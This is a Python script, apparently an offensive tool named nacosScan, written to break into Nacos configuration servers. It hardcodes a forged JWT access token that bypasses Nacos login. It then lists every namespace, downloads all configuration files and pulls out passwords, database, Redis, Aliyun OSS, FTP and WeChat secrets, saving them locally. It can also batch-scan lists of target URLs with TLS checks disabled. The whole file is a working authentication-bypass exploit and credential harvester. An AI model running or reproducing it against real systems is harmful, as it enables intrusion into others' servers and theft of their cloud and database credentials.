import json
import os.path
import requests
import yaml
from urllib.parse import urlparse
import urllib3
import click
from requests.adapters import HTTPAdapter

# 关闭ssl警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

accessToken = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU"


class NacosConfig:
    """
        已知 accessToken 获取所有配置文件
    """

    def __init__(self, url):
        self.url = url
        self.url_format()
        self.accessToken = accessToken
        self.header = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Authorization": "{\"accessToken\":\"" + self.accessToken + "}\",\"tokenTtl\":18000,\"globalAdmin\":true,\"username\":\"nacos\"}",
            "X-Requested-With": "XMLHttpRequest", "Referer": url,
            "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers",
            "Connection": "close"}

        # 期望提取的key
        self.niceKey = ["aliyun", "oss", "datasource", "redis", "ftp", "server", "wechat", "store"]
        self.nicePropertiesKey = ["password"]

        # result
        self.namespaces = []
        self.contents = {'json': [], 'properties': [], 'yaml': [], 'UNKNOWN': []}
        self.values = set()

    def url_format(self):
        try:
            if not self.url.startswith("http://") and not self.url.startswith("https://"):
                self.url = "http://" + self.url

            max_redirects = 3

            session = requests.Session()

            adapter = HTTPAdapter(max_retries=max_redirects)

            session.mount("http://", adapter)
            session.mount("https://", adapter)

            response = session.get(self.url)
            final_url = response.url
            if final_url != "":
                self.url = final_url
        except Exception as e:
            pass
        finally:
            if not self.url.endswith("/"):
                self.url = self.url + "/"

    def run(self):
        try:
            print("now is {}".format(self.url))
            self.getNamespaces()
            self.getConfigs()
            self.findKeyValues()
            self.save()
        except Exception as e:
            print(e)
            pass
        finally:
            return self.values

    def findKeyValues(self):
        """
            期望值解析
        """
        for content in self.contents['yaml']:
            yaml_data = yaml.safe_load(content)
            for key in self.niceKey:
                tvalue = {key: self.findYamlKeyValue(yaml_data, key)}
                if tvalue[key] is not None:
                    self.values.add(str(tvalue))

        for content in self.contents['json']:
            json_data = json.loads(content)
            for key in self.niceKey:
                tvalue = {key: self.findJSONKeyValue(json_data, key)}
                if tvalue[key] is not None:
                    self.values.add(str(tvalue))
            pass

        for content in self.contents['properties']:
            for key in self.nicePropertiesKey:
                tvalue = {key: self.findPropertiesKeyValue(content, key, False)}
                if tvalue[key] is not None:
                    self.values.add(str(tvalue))

    def findPropertiesKeyValue(self, content, key, flag):
        value = set()
        if flag:
            for line in content.splitlines():
                if line.startswith("#"):
                    continue
                if line.startswith(key):
                    value.add(line)
            return value
        else:
            for line in content.splitlines():
                if line.startswith("#"):
                    continue
                sp = line.split(key)
                if len(sp) > 1:
                    return self.findPropertiesKeyValue(content, sp[0], True)

            # if key in line:
            #     print(line)
        return None

    def findJSONKeyValue(self, json_data, target_key):
        """
        递归查找json中的key对应Value值
        """
        if isinstance(json_data, dict):
            # 遍历字典的键值对
            for key, value in json_data.items():
                # 如果找到目标键，返回对应的值
                if key == target_key:
                    return value
                # 如果当前值是一个嵌套的字典或列表，递归调用函数查找
                elif isinstance(value, (dict, list)):
                    result = self.findJSONKeyValue(value, target_key)
                    if result is not None:
                        return result
        elif isinstance(json_data, list):
            # 遍历列表的元素
            for item in json_data:
                # 如果当前元素是一个嵌套的字典或列表，递归调用函数查找
                if isinstance(item, (dict, list)):
                    result = self.findJSONKeyValue(item, target_key)
                    if result is not None:
                        return result
        return None

    def findYamlKeyValue(self, yaml_data, key):
        """
        递归查找yaml中的key对应Value值
        """
        if isinstance(yaml_data, dict):
            for k, v in yaml_data.items():
                if k == key:
                    return v
                else:
                    result = self.findYamlKeyValue(v, key)
                    if result is not None:
                        return result
        elif isinstance(yaml_data, list):
            for item in yaml_data:
                result = self.findYamlKeyValue(item, key)
                if result is not None:
                    return result
        else:
            return

    def getNamespaces(self):
        """
        获取所有的命名空间配置
        """
        configurl = self.url + "v1/console/namespaces?accessToken={}&namespaceId=".format(self.accessToken)
        response = requests.get(configurl, headers=self.header, timeout=10, verify=False)
        if response.status_code != 200:
            return
        response_data = response.json()
        for item in response_data['data']:
            self.namespaces.append(item['namespace'])

    def getConfigs(self):
        if len(self.namespaces) <= 0:
            return
        for namespace in self.namespaces:
            try:
                configsUrl = self.url + "v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant={}&search=accurate&accessToken={}&username={}".format(
                    namespace, self.accessToken, "nacos")
                response = requests.get(configsUrl, headers=self.header, timeout=10, verify=False)
                response_data = response.json()
                for item in response_data['pageItems']:
                    dataId = item["dataId"]
                    if dataId.endswith(".properties"):
                        self.contents['properties'].append(item["content"])
                    elif dataId.endswith(".yaml") or dataId.endswith(".yml"):
                        self.contents['yaml'].append(item["content"])
                    elif dataId.endswith(".json"):
                        self.contents['json'].append(item["content"])
                    else:
                        self.contents['UNKNOWN'].append(item["content"])
            except Exception as e:
                continue

    def save(self):
        if len(self.values) <= 0:
            return

        folder_name = "result"
        if not os.path.exists(folder_name):
            os.mkdir(folder_name)

        file_name = folder_name + "/" + urlparse(self.url).netloc + ".txt"

        # 写入文件内容
        with open(file_name, "w") as file:
            for values in self.contents.values():
                for value in values:
                    file.write(value + "\n")

        print("File created:", file_name)


class NacosConfigManager:
    """
        批量扫描
    """

    def __init__(self, file):
        self.file = file

    def run(self):
        url_files = open(self.file, "r")
        urls = url_files.readlines()
        for url in urls:
            try:
                url = url.strip()
                print("start scan {}".format(url))
                value = NacosConfig(url).run()
                if len(value) != 0:
                    print("find config {}".format(url))
                    for item in value:
                        print(item)
                print("\n\n")
            except:
                pass

    # def getAccessToken(self):
    #     return "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU"


@click.command()
@click.option('-u', '--url', type=str, metavar='<str>', help='url')
@click.option('-uf', '--urls', type=str, metavar='<str>', help='load url from file')
@click.option('-t', '--accesstoken', type=str, metavar='<str>', help='you can change accessToken')
def run_cli(url, urls, accesstoken):
    """
        censys jwtToken bypass login\n
        eg:\n
            python3 nacosScan.py -u http://ip:port -t {accesstoken}\n
            python3 nacosScan.py -uf url.txt\n

                            By. Whoopsunix
    """
    if accesstoken != None:
        global accessToken
        accessToken = accesstoken

    if urls != None:
        NacosConfigManager(urls).run()
    elif url != None:
        values = NacosConfig(url).run()
        for value in values:
            print(value)


if __name__ == '__main__':
    # # 单个
    # url = "https://host/nacos"
    # values = NacosConfig(url).run()
    # for value in values:
    #     print(value)

    # 多个
    # url_files = "url.txt"
    # NacosConfigManager(url_files).run()
    run_cli()
